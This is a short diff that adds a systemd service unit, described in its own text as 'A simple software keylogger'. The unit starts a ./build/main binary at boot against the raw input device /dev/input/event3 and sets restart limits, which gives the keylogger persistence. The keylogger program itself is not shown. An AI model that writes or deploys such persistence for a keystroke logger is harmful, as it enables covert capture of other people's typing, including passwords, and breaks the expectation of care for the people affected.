@@ -1,0 +1,11 @@
+[Unit]
+Description=A simple software keylogger
+ConditionFileIsExecutable=./build/main
+
+[Service]
+StartLimitInterval=5
+StartLimitBurst=10
+ExecStart=./build/main /dev/input/event3
+
+[Install]
+WantedBy=multi-user.target
